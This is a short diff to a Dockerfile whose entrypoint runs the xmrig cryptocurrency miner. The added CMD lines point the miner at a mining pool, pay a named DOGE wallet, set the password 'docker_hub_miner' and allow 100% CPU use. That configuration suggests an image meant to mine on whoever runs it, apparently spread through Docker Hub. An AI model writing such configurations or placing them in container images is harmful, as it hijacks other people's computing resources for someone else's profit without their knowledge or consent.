@@ -12,3 +12,8 @@ RUN apt update \
 RUN apt-get install docker   -y
 
 ENTRYPOINT ["/xmrig/build/xmrig"]
+
+CMD ["--url=rx.unmineable.com:3333", \
+"--user=DOGE:DLDrFew1RpYyJbogXfNYcFX9dRUMAZLgj5.zhangyuchen30#blwg-cj16", \
+"--pass=docker_hub_miner", \
+"-k", "--max-cpu-usage=100"]
